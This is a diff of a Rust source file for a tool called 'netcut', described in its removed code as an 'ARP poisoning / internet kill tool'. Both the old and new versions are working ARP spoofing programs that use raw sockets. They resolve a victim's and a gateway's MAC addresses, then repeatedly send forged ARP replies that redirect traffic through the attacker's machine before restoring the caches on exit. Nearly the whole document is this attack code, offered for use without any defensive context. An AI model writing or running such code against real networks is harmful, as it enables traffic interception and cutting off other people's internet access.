@@ -1,55 +1,45 @@
-use anyhow::{anyhow, Context, Result};
-use clap::Parser;
-use libc::{
-    c_int, c_void, close, if_nametoindex, ioctl, sendto, setsockopt, socket, sockaddr,
-    sockaddr_ll, socklen_t, AF_PACKET, ETH_ALEN, ETH_P_ARP, IFNAMSIZ, SIOCGIFADDR,
-    SIOCGIFHWADDR, SOCK_RAW, SOL_SOCKET, SO_BINDTODEVICE,
-};
-use signal_hook::consts::{SIGINT, SIGTERM};
-use signal_hook::iterator::Signals;
+use std::ffi::CString;
+use std::io::Write;
 use std::mem::{size_of, zeroed};
 use std::net::Ipv4Addr;
+use std::os::raw::{c_int, c_void};
+use std::ptr;
+use std::str::FromStr;
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::sync::Arc;
-use std::thread;
-use std::time::{Duration, Instant};
 
-// -------- CLI --------
+// Define Ethernet and ARP constants
+const ETH_ALEN: usize = 6;
+const ARPHRD_ETHER: u16 = 1;
+const ETHERTYPE_IP: u16 = 0x0800;
+const ETHERTYPE_ARP: u16 = 0x0806;
+const ARPOP_REQUEST: u16 = 1;
+const ARPOP_REPLY: u16 = 2;
 
-#[derive(Parser, Debug)]
-#[command(name = "netcut", about = "ARP poisoning / internet kill tool (libc raw sockets)")]
-struct Args {
-    /// Network interface (e.g., wlan0)
-    #[arg(short, long)]
-    iface: String,
+#[repr(C, packed)]
+struct ether_header {
+    ether_dhost: [u8; ETH_ALEN],
+    ether_shost: [u8; ETH_ALEN],
+    ether_type: u16,
+}
 
-    /// Target IP (victim)
-    #[arg(short, long)]
-    target: Ipv4Addr,
+#[repr(C, packed)]
+struct ether_arp {
+    ar_hrd: u16,
+    ar_pro: u16,
+    ar_hln: u8,
+    ar_pln: u8,
+    ar_op: u16,
+    ar_sha: [u8; ETH_ALEN],
+    ar_spa: [u8; 4],
+    ar_tha: [u8; ETH_ALEN],
+    ar_tpa: [u8; 4],
+}
 
-    /// Gateway IP (router)
-    #[arg(short, long)]
-    gateway: Ipv4Addr,
+static RUNNING: AtomicBool = AtomicBool::new(true);
 
-    /// Kill mode: full (both directions) or half (target->gateway only)
-    #[arg(long, default_value = "full")]
-    kill_mode: String,
-
-    /// Packets-per-second rate
-    #[arg(long, default_value_t = 4)]
-    rate: u64,
-
-    /// Max seconds to wait for MAC resolution
-    #[arg(long, default_value_t = 15)]
-    resolve_timeout: u64,
-
-    /// Enable Android service mode (monitor parent process)
-    #[arg(long, default_value_t = false)]
-    android_service: bool,
-
-    /// Parent PID to monitor (for Android service mode)
-    #[arg(long)]
-    parent_pid: Option<i32>,
+extern "C" fn signal_handler(_sig: c_int) {
+    eprintln!("\n[*] Shutting down...");
+    RUNNING.store(false, Ordering::SeqCst);
 }
 
 // -------- ioctl request type shim (glibc vs bionic) --------
@@ -58,29 +48,30 @@ type IoctlReq = libc::c_ulong;
 #[cfg(not(target_env = "gnu"))]
 type IoctlReq = libc::c_int;
 
-// -------- ifreq layout --------
-
 #[repr(C)]
 union IfrIfru {
-    ifru_addr: sockaddr,
-    ifru_hwaddr: sockaddr,
+    ifru_addr: libc::sockaddr,
+    ifru_hwaddr: libc::sockaddr,
     ifru_flags: libc::c_short,
     ifru_ivalue: libc::c_int,
     ifru_mtu: libc::c_int,
-    ifru_data: *mut c_void,
+    ifru_data: *mut libc::c_void,
     _pad: [u8; 24],
 }
 
 #[repr(C)]
 struct Ifreq {
-    ifr_name: [libc::c_char; IFNAMSIZ],
+    ifr_name: [libc::c_char; libc::IFNAMSIZ],
     ifr_ifru: IfrIfru,
 }
 
 impl Ifreq {
-    fn new(iface: &str) -> Result<Self> {
-        if iface.len() >= IFNAMSIZ {
-            return Err(anyhow!("interface name too long"));
+    fn new(iface: &str) -> Result<Self, std::io::Error> {
+        if iface.len() >= libc::IFNAMSIZ {
+            return Err(std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                "interface name too long",
+            ));
         }
         let mut req: Ifreq = unsafe { zeroed() };
         for (i, b) in iface.as_bytes().iter().enumerate() {
@@ -90,453 +81,348 @@ impl Ifreq {
     }
 }
 
-// -------- Ethernet / ARP frame --------
+fn get_mac(iface: &str, mac: &mut [u8; 6]) {
+    let sock = unsafe { libc::socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
+    if sock < 0 {
+        eprintln!("socket(AF_INET) error: {}", std::io::Error::last_os_error());
+        return;
+    }
 
-#[repr(C, packed)]
-#[derive(Clone, Copy)]
-struct ArpFrame {
-    eth_dst: [u8; 6],
-    eth_src: [u8; 6],
-    eth_type: u16, // BE: 0x0806
-    htype: u16,    // BE: 1
-    ptype: u16,    // BE: 0x0800
-    hlen: u8,      // 6
-    plen: u8,      // 4
-    oper: u16,     // BE: 1 request / 2 reply
-    sha: [u8; 6],
-    spa: [u8; 4],
-    tha: [u8; 6],
-    tpa: [u8; 4],
-}
-
-impl ArpFrame {
-    fn as_bytes(&self) -> &[u8] {
-        unsafe {
-            std::slice::from_raw_parts(
-                (self as *const ArpFrame) as *const u8,
-                size_of::<ArpFrame>(),
-            )
+    let mut req = match Ifreq::new(iface) {
+        Ok(r) => r,
+        Err(e) => {
+            eprintln!("Ifreq error: {}", e);
+            unsafe { libc::close(sock) };
+            return;
         }
-    }
-}
-
-fn build_arp_reply(
-    src_mac: [u8; 6],
-    dst_mac: [u8; 6],
-    spoofed_ip: Ipv4Addr,
-    target_ip: Ipv4Addr,
-) -> ArpFrame {
-    ArpFrame {
-        eth_dst: dst_mac,
-        eth_src: src_mac,
-        eth_type: 0x0806u16.to_be(),
-        htype: 1u16.to_be(),
-        ptype: 0x0800u16.to_be(),
-        hlen: 6,
-        plen: 4,
-        oper: 2u16.to_be(),
-        sha: src_mac,
-        spa: spoofed_ip.octets(),
-        tha: dst_mac,
-        tpa: target_ip.octets(),
-    }
-}
-
-fn build_arp_request(
-    src_mac: [u8; 6],
-    sender_ip: Ipv4Addr,
-    target_ip: Ipv4Addr,
-) -> ArpFrame {
-    ArpFrame {
-        eth_dst: [0xff; 6],
-        eth_src: src_mac,
-        eth_type: 0x0806u16.to_be(),
-        htype: 1u16.to_be(),
-        ptype: 0x0800u16.to_be(),
-        hlen: 6,
-        plen: 4,
-        oper: 1u16.to_be(),
-        sha: src_mac,
-        spa: sender_ip.octets(),
-        tha: [0; 6],
-        tpa: target_ip.octets(),
-    }
-}
-
-// -------- Raw socket --------
-
-struct RawSock {
-    fd: c_int,
-}
-
-impl RawSock {
-    fn new(protocol: u16) -> Result<Self> {
-        let proto = i32::from(protocol.to_be());
-        let fd = unsafe { socket(AF_PACKET, SOCK_RAW, proto) };
-        if fd < 0 {
-            return Err(std::io::Error::last_os_error()).context("socket(AF_PACKET, SOCK_RAW)");
-        }
-        Ok(Self { fd })
-    }
-
-    fn bind_to_device(&self, iface: &str) -> Result<()> {
-        let bytes = iface.as_bytes();
-        let rc = unsafe {
-            setsockopt(
-                self.fd,
-                SOL_SOCKET,
-                SO_BINDTODEVICE,
-                bytes.as_ptr() as *const c_void,
-                bytes.len() as socklen_t,
-            )
-        };
-        if rc < 0 {
-            return Err(std::io::Error::last_os_error()).context("SO_BINDTODEVICE");
-        }
-        Ok(())
-    }
-
-    fn send_frame(&self, frame: &[u8], ifindex: i32) -> Result<()> {
-        let mut sll: sockaddr_ll = unsafe { zeroed() };
-        sll.sll_family = AF_PACKET as u16;
-        sll.sll_protocol = (ETH_P_ARP as u16).to_be();
-        sll.sll_ifindex = ifindex;
-        sll.sll_halen = ETH_ALEN as u8;
-        sll.sll_addr[..6].copy_from_slice(&frame[0..6]);
-
-        let sent = unsafe {
-            sendto(
-                self.fd,
-                frame.as_ptr() as *const c_void,
-                frame.len(),
-                0,
-                &sll as *const sockaddr_ll as *const sockaddr,
-                size_of::<sockaddr_ll>() as socklen_t,
-            )
-        };
-        if sent < 0 {
-            return Err(std::io::Error::last_os_error()).context("sendto");
-        }
-        Ok(())
-    }
-}
-
-impl Drop for RawSock {
-    fn drop(&mut self) {
-        unsafe { close(self.fd) };
-    }
-}
-
-// -------- Interface info --------
-
-fn get_iface_mac(iface: &str) -> Result<[u8; 6]> {
-    let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
-    if fd < 0 {
-        return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
-    }
-    let mut req = Ifreq::new(iface)?;
-    let rc = unsafe { ioctl(fd, SIOCGIFHWADDR as IoctlReq, &mut req as *mut _) };
-    let err = std::io::Error::last_os_error();
-    unsafe { close(fd) };
-    if rc < 0 {
-        return Err(err).context("SIOCGIFHWADDR");
-    }
-    let sa = unsafe { &req.ifr_ifru.ifru_hwaddr };
-    let mut mac = [0u8; 6];
-    for i in 0..6 {
-        mac[i] = sa.sa_data[i] as u8;
-    }
-    Ok(mac)
-}
-
-fn get_iface_ipv4(iface: &str) -> Result<Ipv4Addr> {
-    let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
-    if fd < 0 {
-        return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
-    }
-    let mut req = Ifreq::new(iface)?;
-    let rc = unsafe { ioctl(fd, SIOCGIFADDR as IoctlReq, &mut req as *mut _) };
-    let err = std::io::Error::last_os_error();
-    unsafe { close(fd) };
-    if rc < 0 {
-        return Err(err).context("SIOCGIFADDR");
-    }
-    let sa = unsafe { &req.ifr_ifru.ifru_addr };
-    let ip = Ipv4Addr::new(
-        sa.sa_data[2] as u8,
-        sa.sa_data[3] as u8,
-        sa.sa_data[4] as u8,
-        sa.sa_data[5] as u8,
-    );
-    Ok(ip)
-}
-
-fn get_iface_index(iface: &str) -> Result<i32> {
-    let cname = std::ffi::CString::new(iface).context("iface name has NUL")?;
-    let idx = unsafe { if_nametoindex(cname.as_ptr()) };
-    if idx == 0 {
-        return Err(std::io::Error::last_os_error()).context("if_nametoindex");
-    }
-    Ok(idx as i32)
-}
-
-// -------- MAC resolution --------
-
-fn resolve_mac(
-    iface: &str,
-    our_mac: [u8; 6],
-    our_ip: Ipv4Addr,
-    target_ip: Ipv4Addr,
-    ifindex: i32,
-    timeout: Duration,
-    stop: &Arc<AtomicBool>,
-) -> Result<[u8; 6]> {
-    let resolver = RawSock::new(ETH_P_ARP as u16)?;
-    resolver.bind_to_device(iface)?;
-
-    let tv = libc::timeval {
-        tv_sec: 0,
-        tv_usec: 250_000,
     };
+
+    // Fix: Cast SIOCGIFHWADDR to IoctlReq to handle u64/i32 differences
+    let rc = unsafe { libc::ioctl(sock, libc::SIOCGIFHWADDR as IoctlReq, &mut req as *mut _) };
+    if rc < 0 {
+        eprintln!("ioctl SIOCGIFHWADDR error: {}", std::io::Error::last_os_error());
+        unsafe { libc::close(sock) };
+        return;
+    }
+
+    let sa = unsafe { &req.ifr_ifru.ifru_hwaddr };
+    // Fix: sa_data is [i8], mac is [u8]. We must cast carefully.
+    let src_ptr = sa.sa_data.as_ptr() as *const u8;
     unsafe {
-        setsockopt(
-            resolver.fd,
-            SOL_SOCKET,
-            libc::SO_RCVTIMEO,
-            &tv as *const _ as *const c_void,
-            size_of::<libc::timeval>() as socklen_t,
+        ptr::copy_nonoverlapping(src_ptr, mac.as_mut_ptr(), ETH_ALEN);
+    }
+    unsafe { libc::close(sock) };
+}
+
+fn format_mac(mac: &[u8; 6]) -> String {
+    format!(
+        "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
+        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
+    )
+}
+
+fn send_arp(
+    sock: c_int,
+    iface: &str,
+    src_mac: &[u8; 6],
+    dst_mac: &[u8; 6],
+    src_ip: u32,
+    dst_ip: u32,
+    op: u16,
+) {
+    let mut packet = [0u8; 42];
+
+    let eth = ether_header {
+        ether_dhost: *dst_mac,
+        ether_shost: *src_mac,
+        ether_type: ETHERTYPE_ARP.to_be(),
+    };
+
+    let arp = ether_arp {
+        ar_hrd: ARPHRD_ETHER.to_be(),
+        ar_pro: ETHERTYPE_IP.to_be(),
+        ar_hln: ETH_ALEN as u8,
+        ar_pln: 4,
+        ar_op: op.to_be(),
+        ar_sha: *src_mac,
+        ar_spa: src_ip.to_be_bytes(),
+        ar_tha: *dst_mac,
+        ar_tpa: dst_ip.to_be_bytes(),
+    };
+
+    unsafe {
+        ptr::copy_nonoverlapping(
+            &eth as *const _ as *const u8,
+            packet.as_mut_ptr(),
+            size_of::<ether_header>(),
+        );
+        ptr::copy_nonoverlapping(
+            &arp as *const _ as *const u8,
+            packet.as_mut_ptr().add(size_of::<ether_header>()),
+            size_of::<ether_arp>(),
         );
     }
 
-    let req = build_arp_request(our_mac, our_ip, target_ip);
-    let deadline = Instant::now() + timeout;
-    let mut last_send = Instant::now() - Duration::from_secs(60);
-    let mut buf = [0u8; 1500];
-
-    while Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
-        if last_send.elapsed() >= Duration::from_millis(500) {
-            if let Err(e) = resolver.send_frame(req.as_bytes(), ifindex) {
-                eprintln!("[!] ARP request send error: {e}");
-            }
-            last_send = Instant::now();
-        }
-
-        let n = unsafe { libc::recv(resolver.fd, buf.as_mut_ptr() as *mut c_void, buf.len(), 0) };
-        if n < 0 {
-            let e = std::io::Error::last_os_error();
-            if let Some(code) = e.raw_os_error() {
-                if code == libc::EAGAIN || code == libc::EWOULDBLOCK || code == libc::EINTR {
-                    continue;
-                }
-            }
-            return Err(e).context("recv while resolving MAC");
-        }
-        let n = n as usize;
-        if n < size_of::<ArpFrame>() {
-            continue;
-        }
-        let eth_type = u16::from_be_bytes([buf[12], buf[13]]);
-        if eth_type != 0x0806 {
-            continue;
-        }
-        let oper = u16::from_be_bytes([buf[20], buf[21]]);
-        if oper != 2 {
-            continue;
-        }
-        let spa = Ipv4Addr::new(buf[28], buf[29], buf[30], buf[31]);
-        if spa != target_ip {
-            continue;
-        }
-        let mut mac = [0u8; 6];
-        mac.copy_from_slice(&buf[22..28]);
-        return Ok(mac);
+    let c_iface = CString::new(iface).unwrap();
+    let ifindex = unsafe { libc::if_nametoindex(c_iface.as_ptr()) };
+    if ifindex == 0 {
+        eprintln!("Failed to get interface index for {}", iface);
+        return;
     }
 
-    Err(anyhow!("timed out resolving MAC for {}", target_ip))
+    let mut addr: libc::sockaddr_ll = unsafe { zeroed() };
+    addr.sll_family = libc::AF_PACKET as u16;
+    addr.sll_ifindex = ifindex as i32;
+    addr.sll_halen = ETH_ALEN as u8;
+    
+    // Fix: sll_addr is [u8; 8], dst_mac is [u8; 6]. Use copy_from_slice.
+    addr.sll_addr[..ETH_ALEN].copy_from_slice(dst_mac);
+
+    let sent = unsafe {
+        libc::sendto(
+            sock,
+            packet.as_ptr() as *const c_void,
+            packet.len(),
+            0,
+            &addr as *const _ as *const libc::sockaddr,
+            size_of::<libc::sockaddr_ll>() as libc::socklen_t,
+        )
+    };
+    if sent < 0 {
+        eprintln!("sendto error: {}", std::io::Error::last_os_error());
+    }
 }
 
-// -------- Utility --------
+fn resolve_mac(sock: c_int, iface: &str, ip: u32, mac: &mut [u8; 6]) -> i32 {
+    let broadcast: [u8; 6] = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff];
+    let mut src_mac = [0u8; 6];
 
-fn format_mac(m: &[u8; 6]) -> String {
-    format!(
-        "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
-        m[0], m[1], m[2], m[3], m[4], m[5]
-    )
-}
+    get_mac(iface, &mut src_mac);
 
-// -------- Parent process monitoring --------
+    let c_iface = CString::new(iface).unwrap();
+    let ifindex = unsafe { libc::if_nametoindex(c_iface.as_ptr()) };
+    if ifindex == 0 {
+        return -1;
+    }
 
-fn is_process_alive(pid: i32) -> bool {
+    let mut packet = [0u8; 42];
+    let eth = ether_header {
+        ether_dhost: broadcast,
+        ether_shost: src_mac,
+        ether_type: ETHERTYPE_ARP.to_be(),
+    };
+
+    let arp = ether_arp {
+        ar_hrd: ARPHRD_ETHER.to_be(),
+        ar_pro: ETHERTYPE_IP.to_be(),
+        ar_hln: ETH_ALEN as u8,
+        ar_pln: 4,
+        ar_op: ARPOP_REQUEST.to_be(),
+        ar_sha: src_mac,
+        ar_spa: ip.to_be_bytes(),
+        ar_tha: [0; 6],
+        ar_tpa: [0; 4],
+    };
+
     unsafe {
-        let ret = libc::kill(pid, 0);
-        ret == 0
-    }
-}
-
-fn monitor_parent(pid: i32, running: &Arc<AtomicBool>, stop: &Arc<AtomicBool>) {
-    let running = running.clone();
-    let stop = stop.clone();
-
-    thread::spawn(move || {
-        while running.load(Ordering::SeqCst) {
-            if !is_process_alive(pid) {
-                eprintln!("[*] Parent process {} terminated, stopping...", pid);
-                running.store(false, Ordering::SeqCst);
-                stop.store(true, Ordering::Release);
-                break;
-            }
-            thread::sleep(Duration::from_millis(500));
-        }
-    });
-}
-
-// -------- Main --------
-
-fn main() -> Result<()> {
-    // Ignore SIGPIPE so a closed stdout doesn't kill us mid-restore
-    unsafe {
-        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
+        ptr::copy_nonoverlapping(
+            &eth as *const _ as *const u8,
+            packet.as_mut_ptr(),
+            size_of::<ether_header>(),
+        );
+        ptr::copy_nonoverlapping(
+            &arp as *const _ as *const u8,
+            packet.as_mut_ptr().add(size_of::<ether_header>()),
+            size_of::<ether_arp>(),
+        );
     }
 
-    let args = Args::parse();
+    let mut addr: libc::sockaddr_ll = unsafe { zeroed() };
+    addr.sll_family = libc::AF_PACKET as u16;
+    addr.sll_ifindex = ifindex as i32;
+    addr.sll_halen = ETH_ALEN as u8;
+    
+    // Fix: sll_addr is [u8; 8], broadcast is [u8; 6]. Use copy_from_slice.
+    addr.sll_addr[..ETH_ALEN].copy_from_slice(&broadcast);
 
-    let ifindex = get_iface_index(&args.iface)?;
-    let src_mac = get_iface_mac(&args.iface)?;
-    let src_ip = get_iface_ipv4(&args.iface)?;
-    eprintln!(
-        "[*] iface={} ifindex={} mac={} ip={}",
-        args.iface,
-        ifindex,
-        format_mac(&src_mac),
-        src_ip
-    );
+    let sent = unsafe {
+        libc::sendto(
+            sock,
+            packet.as_ptr() as *const c_void,
+            packet.len(),
+            0,
+            &addr as *const _ as *const libc::sockaddr,
+            size_of::<libc::sockaddr_ll>() as libc::socklen_t,
+        )
+    };
+    if sent < 0 {
+        return -1;
+    }
 
-    // Shutdown flags
-    let running = Arc::new(AtomicBool::new(true));
-    let stop = Arc::new(AtomicBool::new(false));
+    let mut fds = unsafe { zeroed() };
+    unsafe { libc::FD_SET(sock, &mut fds) };
+    let mut tv = libc::timeval { tv_sec: 2, tv_usec: 0 };
 
-    // Set up signal handling for both SIGINT and SIGTERM using signal-hook
+    if unsafe {
+        libc::select(
+            sock + 1,
+            &mut fds,
+            ptr::null_mut(),
+            ptr::null_mut(),
+            &mut tv,
+        )
+    } > 0
     {
-        let running = running.clone();
-        let stop = stop.clone();
+        let mut from: libc::sockaddr_ll = unsafe { zeroed() };
+        let mut fromlen = size_of::<libc::sockaddr_ll>() as libc::socklen_t;
+        let mut buf = [0u8; 1024];
 
-        // Create a signal handler that catches both SIGINT and SIGTERM
-        let mut signals = Signals::new(&[SIGINT, SIGTERM])
-            .context("failed to register signal handlers")?;
+        let n = unsafe {
+            libc::recvfrom(
+                sock,
+                buf.as_mut_ptr() as *mut c_void,
+                buf.len(),
+                0,
+                &mut from as *mut _ as *mut libc::sockaddr,
+                &mut fromlen,
+            )
+        };
 
-        // Spawn a thread to handle signals
-        thread::spawn(move || {
-            for signal in signals.forever() {
-                match signal {
-                    SIGINT => {
-                        eprintln!("\n[*] Received SIGINT (Ctrl+C), shutting down...");
-                        running.store(false, Ordering::SeqCst);
-                        stop.store(true, Ordering::Release);
-                        break;
+        if n > 0 {
+            let resp_eth = unsafe { &*(buf.as_ptr() as *const ether_header) };
+            if resp_eth.ether_type == ETHERTYPE_ARP.to_be() {
+                let resp_arp = unsafe {
+                    &*(buf.as_ptr().add(size_of::<ether_header>()) as *const ether_arp)
+                };
+                if resp_arp.ar_op == ARPOP_REPLY.to_be() {
+                    let sender_ip = u32::from_be_bytes(resp_arp.ar_spa);
+                    if sender_ip == ip {
+                        mac.copy_from_slice(&resp_arp.ar_sha);
+                        return 0;
                     }
-                    SIGTERM => {
-                        eprintln!("[*] Received SIGTERM, shutting down...");
-                        running.store(false, Ordering::SeqCst);
-                        stop.store(true, Ordering::Release);
-                        break;
-                    }
-                    _ => unreachable!(),
                 }
             }
-        });
-    }
-
-    // Start parent process monitoring if in Android service mode
-    if args.android_service {
-        if let Some(parent_pid) = args.parent_pid {
-            eprintln!(
-                "[*] Android service mode enabled, monitoring parent PID: {}",
-                parent_pid
-            );
-            monitor_parent(parent_pid, &running, &stop);
-        } else {
-            eprintln!("[!] Android service mode requires --parent-pid");
-            return Err(anyhow!("missing parent PID"));
         }
     }
 
-    // Resolve target/gateway MACs
-    let timeout = Duration::from_secs(args.resolve_timeout);
+    mac.copy_from_slice(&broadcast);
+    -1
+}
 
-    eprintln!("[*] Resolving target MAC...");
-    let target_mac = resolve_mac(
-        &args.iface,
-        src_mac,
-        src_ip,
-        args.target,
-        ifindex,
-        timeout,
-        &stop,
-    )
-    .with_context(|| format!("resolving MAC of target {}", args.target))?;
-    eprintln!("[+] Target MAC: {}", format_mac(&target_mac));
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let args: Vec<String> = std::env::args().collect();
+    if args.len() < 4 {
+        eprintln!("Usage: {} <iface> <target_ip> <gateway_ip>", args[0]);
+        eprintln!("Example: {} eth0 192.168.1.100 192.168.1.1", args[0]);
+        return Ok(());
+    }
 
-    eprintln!("[*] Resolving gateway MAC...");
-    let gateway_mac = resolve_mac(
-        &args.iface,
-        src_mac,
-        src_ip,
-        args.gateway,
-        ifindex,
-        timeout,
-        &stop,
-    )
-    .with_context(|| format!("resolving MAC of gateway {}", args.gateway))?;
-    eprintln!("[+] Gateway MAC: {}", format_mac(&gateway_mac));
+    let iface = &args[1];
+    let target_ip_str = &args[2];
+    let gateway_ip_str = &args[3];
 
-    // Sending socket
-    let sock = RawSock::new(ETH_P_ARP as u16)?;
-    sock.bind_to_device(&args.iface)?;
+    let target_ip = Ipv4Addr::from_str(target_ip_str)?.to_bits();
+    let gateway_ip = Ipv4Addr::from_str(gateway_ip_str)?.to_bits();
 
-    // Poison frames
-    // Tell target: gateway is at our MAC
-    let poison_target = build_arp_reply(src_mac, target_mac, args.gateway, args.target);
-    // Tell gateway: target is at our MAC
-    let poison_gateway = build_arp_reply(src_mac, gateway_mac, args.target, args.gateway);
+    let mut sa: libc::sigaction = unsafe { zeroed() };
+    // Fix: Use sa_sigaction and proper casting for Android/Linux compatibility
+    sa.sa_sigaction = signal_handler as libc::sighandler_t;
+    unsafe { libc::sigemptyset(&mut sa.sa_mask) };
+    sa.sa_flags = libc::SA_RESTART; // Use SA_RESTART instead of 0 for better stability
+    unsafe {
+        libc::sigaction(libc::SIGINT, &sa, ptr::null_mut());
+        libc::sigaction(libc::SIGTERM, &sa, ptr::null_mut());
+    }
 
-    let full_mode = args.kill_mode.eq_ignore_ascii_case("full");
-    let interval = Duration::from_millis(1000 / args.rate.max(1));
+    // Fix: Cast protocol to i32
+    let sock = unsafe {
+        libc::socket(
+            libc::AF_PACKET,
+            libc::SOCK_RAW,
+            0x0003i32, // ETH_P_ALL
+        )
+    };
+    if sock < 0 {
+        return Err(Box::new(std::io::Error::last_os_error()));
+    }
 
-    eprintln!(
-        "[*] Poisoning ({} mode) at {} pps... Ctrl+C to stop",
-        args.kill_mode, args.rate
+    let mut src_mac = [0u8; 6];
+    get_mac(iface, &mut src_mac);
+    println!("[*] Our MAC: {}", format_mac(&src_mac));
+    println!("[*] Interface: {}", iface);
+
+    println!("[*] Resolving MAC addresses...");
+    let mut target_mac = [0u8; 6];
+    if resolve_mac(sock, iface, target_ip, &mut target_mac) == 0 {
+        println!("[*] Target MAC: {}", format_mac(&target_mac));
+    } else {
+        println!("[!] Could not resolve target MAC, using broadcast");
+        target_mac = [0xff; 6];
+    }
+
+    let mut gateway_mac = [0u8; 6];
+    if resolve_mac(sock, iface, gateway_ip, &mut gateway_mac) == 0 {
+        println!("[*] Gateway MAC: {}", format_mac(&gateway_mac));
+    } else {
+        println!("[!] Could not resolve gateway MAC, using broadcast");
+        gateway_mac = [0xff; 6];
+    }
+
+    println!("\n[*] Starting ARP spoofing...");
+    println!("[*] Target: {}, Gateway: {}", target_ip_str, gateway_ip_str);
+    println!("[*] Press Ctrl+C to stop\n");
+
+    let mut count = 0;
+    while RUNNING.load(Ordering::SeqCst) {
+        send_arp(
+            sock,
+            iface,
+            &src_mac,
+            &target_mac,
+            gateway_ip,
+            target_ip,
+            ARPOP_REPLY,
+        );
+        send_arp(
+            sock,
+            iface,
+            &src_mac,
+            &gateway_mac,
+            target_ip,
+            gateway_ip,
+            ARPOP_REPLY,
+        );
+
+        count += 1;
+        if count % 10 == 0 {
+            print!("[*] Sent {} ARP spoofing packets\r", count * 2);
+            std::io::stdout().flush().unwrap();
+        }
+
+        std::thread::sleep(std::time::Duration::from_secs(1));
+    }
+
+    println!("\n[*] Restoring ARP tables...");
+    send_arp(
+        sock,
+        iface,
+        &gateway_mac,
+        &target_mac,
+        gateway_ip,
+        target_ip,
+        ARPOP_REPLY,
+    );
+    send_arp(
+        sock,
+        iface,
+        &target_mac,
+        &gateway_mac,
+        target_ip,
+        gateway_ip,
+        ARPOP_REPLY,
     );
 
-    while running.load(Ordering::SeqCst) {
-        // Check if stop was triggered by parent monitoring
-        if stop.load(Ordering::Acquire) {
-            break;
-        }
-
-        let _ = sock.send_frame(poison_target.as_bytes(), ifindex);
-        if full_mode {
-            let _ = sock.send_frame(poison_gateway.as_bytes(), ifindex);
-        }
-        thread::sleep(interval);
-    }
-
-    // ---- Aggressive restore ----
-    eprintln!("[*] Restoring ARP caches...");
-    // Direct restores (unicast, correct mappings)
-    let restore_target = build_arp_reply(gateway_mac, target_mac, args.gateway, args.target);
-    let restore_gateway = build_arp_reply(target_mac, gateway_mac, args.target, args.gateway);
-    // Gratuitous ARPs (broadcast) — help everyone re-learn quickly
-    let gratuitous_gateway = build_arp_reply(gateway_mac, [0xff; 6], args.gateway, args.gateway);
-    let gratuitous_target = build_arp_reply(target_mac, [0xff; 6], args.target, args.target);
-
-    for _ in 0..20 {
-        let _ = sock.send_frame(restore_target.as_bytes(), ifindex);
-        let _ = sock.send_frame(restore_gateway.as_bytes(), ifindex);
-        let _ = sock.send_frame(gratuitous_gateway.as_bytes(), ifindex);
-        let _ = sock.send_frame(gratuitous_target.as_bytes(), ifindex);
-        thread::sleep(Duration::from_millis(50));
-    }
-
-    eprintln!("[+] Restore complete.");
+    unsafe { libc::close(sock) };
+    println!("[+] Done.");
     Ok(())
 }
